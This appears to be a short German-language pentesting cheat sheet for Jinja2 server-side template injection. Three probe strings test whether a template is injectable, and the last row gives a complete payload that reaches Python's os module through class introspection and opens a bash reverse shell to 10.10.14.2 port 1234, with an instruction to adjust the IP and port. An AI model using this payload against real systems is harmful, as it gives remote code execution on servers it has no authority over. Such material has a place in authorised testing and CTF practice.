## JinJa2

| **Command** | **Description** |
| --- | --- |
| `${7*7}` -\> False | Erster Testschritt |
| `{{7*7}}` -\> True 49 | Zweiter Testschritt |
| `{{7*'7'}}` -\> True 7777777 | Dritter Testschritt |
| `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'").read()}}{%endif%}{%endfor%}` | Reverse Shell, IP und Port anpassen |
